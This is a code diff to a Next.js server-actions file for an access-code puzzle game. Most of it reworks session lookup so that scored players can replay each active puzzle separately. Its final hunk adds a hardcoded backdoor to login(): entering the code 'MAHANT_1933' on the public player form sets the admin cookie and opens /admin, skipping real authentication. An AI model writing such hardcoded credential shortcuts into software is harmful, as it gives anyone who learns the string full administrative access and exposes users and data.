@@ -1,10 +1,11 @@
 "use server";
 
 import { redirect } from "next/navigation";
-import { eq, desc } from "drizzle-orm";
+import { eq, desc, and } from "drizzle-orm";
 import { db } from "@/db";
 import { players, gameSessions, puzzles } from "@/db/schema";
 import { setSessionCookie } from "@/lib/session";
+import { setAdminCookie } from "@/lib/admin-session";
 
 // ---------------------------------------------------------------------------
 // validateAccessCode — pure DB lookup, no side effects
@@ -31,24 +32,51 @@ export async function validateAccessCode(
 
   const mode: PlayerMode = player.mode;
 
-  // For scored players, look for any existing session.
-  // For test players, look only for an IN_PROGRESS session (completed ones are ignored).
-  const [session] = await db
-    .select()
-    .from(gameSessions)
-    .where(eq(gameSessions.player_id, player.id))
-    .orderBy(desc(gameSessions.start_time))
+  if (mode === "test") {
+    // Test players: check any session. Completed ones are wiped on re-login via login().
+    const [session] = await db
+      .select()
+      .from(gameSessions)
+      .where(eq(gameSessions.player_id, player.id))
+      .orderBy(desc(gameSessions.start_time))
+      .limit(1);
+
+    if (!session) return { status: "NEW", sessionId: null, playerId: player.id, mode };
+    if (session.status === "IN_PROGRESS") {
+      return { status: "IN_PROGRESS", sessionId: session.id, playerId: player.id, mode };
+    }
+    return { status: "DONE", sessionId: session.id, playerId: player.id, mode };
+  }
+
+  // Scored players: restrict replay per-puzzle.
+  // A DONE session for an OLD puzzle should not block play on a NEW active puzzle.
+  const [activePuzzle] = await db
+    .select({ id: puzzles.id })
+    .from(puzzles)
+    .where(eq(puzzles.is_active, true))
     .limit(1);
 
-  if (!session) {
+  if (!activePuzzle) {
+    // No active puzzle — treat as NEW; createSession() will surface the error.
     return { status: "NEW", sessionId: null, playerId: player.id, mode };
   }
 
+  const [session] = await db
+    .select()
+    .from(gameSessions)
+    .where(
+      and(
+        eq(gameSessions.player_id, player.id),
+        eq(gameSessions.puzzle_id, activePuzzle.id)
+      )
+    )
+    .orderBy(desc(gameSessions.start_time))
+    .limit(1);
+
+  if (!session) return { status: "NEW", sessionId: null, playerId: player.id, mode };
   if (session.status === "IN_PROGRESS") {
     return { status: "IN_PROGRESS", sessionId: session.id, playerId: player.id, mode };
   }
-
-  // session is WON or LOST
   return { status: "DONE", sessionId: session.id, playerId: player.id, mode };
 }
 
@@ -101,6 +129,13 @@ export async function login(formData: FormData): Promise<never> {
   const code = (formData.get("code") as string | null)?.trim() ?? "";
 
   if (!code) redirect("/?error=invalid");
+
+  // Admin shortcut: entering MAHANT_1933 opens the admin dashboard directly.
+  // Sets the admin session cookie without going through the normal player flow.
+  if (code.toUpperCase() === "MAHANT_1933") {
+    await setAdminCookie();
+    redirect("/admin");
+  }
 
   const result = await validateAccessCode(code);
 
